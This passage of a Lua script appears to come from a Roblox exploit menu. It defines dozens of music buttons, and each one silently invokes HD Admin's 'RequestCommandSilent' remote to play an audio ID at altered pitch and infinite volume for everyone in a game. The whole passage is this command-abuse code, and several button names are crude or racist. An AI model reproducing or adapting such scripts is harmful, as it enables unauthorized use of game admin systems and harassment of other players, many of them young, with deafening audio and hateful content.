        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73002098096282")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Mi Casa",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 123802828776197")
SilentRequest:InvokeServer(";pitch 0.128")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Trap",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 96187142079390")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Again",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 81175200591199")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Sesame Street",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 92512466676196")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "doesn't work",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 71956674693421")
SilentRequest:InvokeServer(";pitch 1.7")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Rebzyyx",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 126202579497643")
SilentRequest:InvokeServer(";pitch 0.123")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "SunBurst",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 121336636707861")
end
})
MusicAddButton({
    Name = "Return Of The Tres",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 109008039044385")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Moan",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 126738363909118")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "90MH",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 93749495002488")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "XANAX",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 82013515789569")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Boom may/not work",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 81002566579651")
SilentRequest:InvokeServer(";pitch .165")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Phonk",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 92864828514905")
SilentRequest:InvokeServer(";pitch .25")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Subway Sexists",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 137418375092271")
SilentRequest:InvokeServer(";pitch .11")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Is Ya Ready",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97452120217197")
SilentRequest:InvokeServer(";pitch .12")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Brace Yourself",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 131397206526762")
SilentRequest:InvokeServer(";pitch .195")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Phonk 2",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 99203686468113")
SilentRequest:InvokeServer(";pitch .31")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Eva",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97957383071356")
SilentRequest:InvokeServer(";pitch .14")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Lo Tuyo basura",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 120471800715754")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Meepcity",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 132569789083172")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "MasterSword",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97729048791539")
SilentRequest:InvokeServer(";pitch 0.096")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "PornHub",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 4813706721")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Money Machine",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 106282004905868")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Juju Falls",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 139955346288828")
SilentRequest:InvokeServer(";pitch 1.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Funky Town",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 70635213877495")
SilentRequest:InvokeServer(";pitch 0.1625")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Idk",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73493639474942")
SilentRequest:InvokeServer(";pitch 0.142")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "I Wonder",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 78883853326072")
SilentRequest:InvokeServer(";pitch 0.13")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Hey Come On",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 132068938707992")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Justin Bieber",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 75278373350178")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Back Of My car",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 125931971467995")
SilentRequest:InvokeServer(";pitch 0.106")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Shotta Flow",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 128394588892703")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "FUCK HIM FUCK HER",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 87174269808530")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Favorite Opp",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 84532879632694")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Sippingtea",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 133972581677289")
SilentRequest:InvokeServer(";pitch 0.209")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "k00pkidd theme",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 1839246711")
SilentRequest:InvokeServer(";pitch 0.9")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "I'm not so lucky",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 120785124326826")
SilentRequest:InvokeServer(";pitch 1.425")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Crazy Story pt3",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 111241909220773")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "new 4 jeeps",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 72884935040724")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Boom",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 138394501994868")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "After you",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 2086899859")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Same As it was",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 111100863896687")
SilentRequest:InvokeServer(";pitch 0.170")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Love Sosa Loop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 94120981214334")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Disco Song Idk",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 119922505582821")
SilentRequest:InvokeServer(";pitch 0.1925")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Gleesh Place",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 103339724966801")
SilentRequest:InvokeServer(";pitch 0.121")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Chop ur dick off",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 72791559471111")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Mexican Music 2",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 80225779962452")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Old Meme Song",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 114366138718591")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Comet Idk",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 79046555065858")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
end
})

MusicAddButton({
    Name = "Gasolina",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97343438223516")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})

MusicAddButton({
    Name = "Bodypartz",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 124475050697813")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
end
})

MusicAddButton({
    Name = "Lieu drain",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 138082567751646")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Oh Yuh",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 82222222329211")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "OverRide",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 125479500950400")
SilentRequest:InvokeServer(";pitch 0.205")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Sugar Crash Better",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 118510088348722")
SilentRequest:InvokeServer(";pitch 0.205")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "bodypartz low quality",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110832648978026")
SilentRequest:InvokeServer(";pitch 0.101")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Speed shake pt2",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 83660735937294")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "boys are liars",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 126427182064251")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Still Dre",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 117137820246363")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "NightCore 18 pt2",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 140292888574146")
SilentRequest:InvokeServer(";pitch 0.17")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Tri polaski",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 101381195264372")
SilentRequest:InvokeServer(";pitch .17")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Hench mafia",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 120433498285797")
SilentRequest:InvokeServer(";pitch .130")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Buy U",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 133295481149193")
SilentRequest:InvokeServer(";pitch .12")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Meet Yo Maker",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 131862636969853")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Crank Dat Racist",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 83819978755789")
SilentRequest:InvokeServer(";pitch .120")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "MoonMan",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 72266196363368")
SilentRequest:InvokeServer(";pitch .27")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Mlg Derulo",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 135348619400760")
SilentRequest:InvokeServer(";pitch .11")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Smt Goon",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 135820191667328")
SilentRequest:InvokeServer(";pitch .2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Allah Song",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 100754234156181")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Pure Imagination",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 90790763485465")
SilentRequest:InvokeServer(";pitch .2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Neck Hurt",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 127724732955346")
SilentRequest:InvokeServer(";pitch .2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Winds of fjords",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 134907499311321")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Vacation",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 102444022933671")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Majora Mask",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 116552457534705")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Just Rob Me",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 74929011014877")
SilentRequest:InvokeServer(";pitch .133")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Black&Yellow",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 92209270000208")
SilentRequest:InvokeServer(";pitch .11")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Lose Ys",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 93023299754944")
SilentRequest:InvokeServer(";pitch .11")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Freaks",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97546613399279")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Jumpstyle",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 76750962223675")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Pants Pocket",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73835470482241")
SilentRequest:InvokeServer(";pitch .28")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "LazyTown",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 106687731139619")
SilentRequest:InvokeServer(";pitch 0.115")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Arab",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 135009652401688")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Body Rolls",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 128327365740560")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "LAMAR NGA",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
